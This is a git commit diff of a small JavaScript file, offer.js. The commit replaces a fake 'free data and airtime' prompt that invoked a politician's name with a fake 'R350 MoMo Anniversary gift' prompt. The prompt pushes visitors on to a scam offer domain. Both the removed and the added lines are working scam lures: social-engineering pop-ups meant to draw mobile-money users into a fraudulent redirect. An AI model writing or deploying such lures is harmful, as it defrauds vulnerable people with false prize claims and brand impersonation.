7a14b7666f34d5f1bdab8523c2710c8b5c79f955
lagalfredben <lagalfredben@gmail.com>
2025-08-05 22:36:02 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,7 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = 'WITHDRAW R350'
+password=prompt('SMS: Congratulations, your MoMo account has qualified to receive the R350 MoMo Anniversary gift, Please Click OK TO CONTINUE ','WITHDRAW R350');
+if (password != 'WITHDRAW R350') {
+location.href='https://momo-za.offer-it.live/Gift';
+
 }
